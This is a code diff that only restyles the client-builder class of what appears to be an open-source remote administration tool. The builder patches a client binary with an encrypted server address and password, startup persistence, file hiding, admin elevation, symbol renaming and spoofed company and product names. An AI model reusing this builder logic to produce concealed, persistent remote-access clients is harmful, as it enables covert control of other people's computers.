@@ -8,11 +8,13 @@ namespace xServer.Core.Build
 {
     public static class ClientBuilder
     {
-        public static void Build(string output, string host, string password, string installsub, string installname, string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay, int installpath, bool adminelevation, string iconpath, string[] asminfo, string version)
+        public static void Build(string output, string host, string password, string installsub, string installname,
+            string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay,
+            int installpath, bool adminelevation, string iconpath, string[] asminfo, string version)
         {
             // PHASE 1 - Settings
-            string encKey = Helper.Helper.GetRandomName(20);
-            AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly("client.bin");
+            var encKey = Helper.Helper.GetRandomName(20);
+            var asmDef = AssemblyDefinition.ReadAssembly("client.bin");
 
             foreach (var typeDef in asmDef.Modules[0].Types)
             {
@@ -24,7 +26,7 @@ namespace xServer.Core.Build
                         {
                             int strings = 1, bools = 1, ints = 1;
 
-                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
+                            for (var i = 0; i < methodDef.Body.Instructions.Count; i++)
                             {
                                 if (methodDef.Body.Instructions[i].OpCode.Name == "ldstr") // string
                                 {
@@ -33,45 +35,57 @@ namespace xServer.Core.Build
                                         case 1: //version
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(version, encKey);
                                             break;
+
                                         case 2: //ip/hostname
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(host, encKey);
                                             break;
+
                                         case 3: //password
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(password, encKey);
                                             break;
+
                                         case 4: //installsub
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(installsub, encKey);
                                             break;
+
                                         case 5: //installname
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(installname, encKey);
                                             break;
+
                                         case 6: //mutex
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(mutex, encKey);
                                             break;
+
                                         case 7: //startupkey
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(startupkey, encKey);
                                             break;
+
                                         case 8: //random encryption key
                                             methodDef.Body.Instructions[i].Operand = encKey;
                                             break;
                                     }
                                     strings++;
                                 }
-                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.1" || methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.0") // bool
+                                else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.1" ||
+                                         methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.0") // bool
                                 {
                                     switch (bools)
                                     {
                                         case 1: //install
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(install));
                                             break;
+
                                         case 2: //startup
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(startup));
                                             break;
+
                                         case 3: //hidefile
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(hidefile));
                                             break;
+
                                         case 4: //AdminElevation
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(adminelevation));
+                                            methodDef.Body.Instructions[i] =
+                                                Instruction.Create(BoolOpcode(adminelevation));
                                             break;
                                     }
                                     bools++;
@@ -83,6 +97,7 @@ namespace xServer.Core.Build
                                         case 1: //port
                                             methodDef.Body.Instructions[i].Operand = port;
                                             break;
+
                                         case 2: //reconnectdelay
                                             methodDef.Body.Instructions[i].Operand = reconnectdelay;
                                             break;
@@ -100,7 +115,7 @@ namespace xServer.Core.Build
             }
 
             // PHASE 2 - Renaming
-            Renamer r = new Renamer(asmDef);
+            var r = new Renamer(asmDef);
             if (!r.Perform())
                 throw new Exception("renaming failed");
 
@@ -110,14 +125,14 @@ namespace xServer.Core.Build
             // PHASE 4 - Assembly Information changing
             if (asminfo != null)
             {
-                VersionResource versionResource = new VersionResource();
+                var versionResource = new VersionResource();
                 versionResource.LoadFrom(output);
 
                 versionResource.FileVersion = asminfo[7];
                 versionResource.ProductVersion = asminfo[6];
                 versionResource.Language = 0;
 
-                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
+                var stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
                 stringFileInfo["CompanyName"] = asminfo[2];
                 stringFileInfo["FileDescription"] = asminfo[1];
                 stringFileInfo["ProductName"] = asminfo[0];
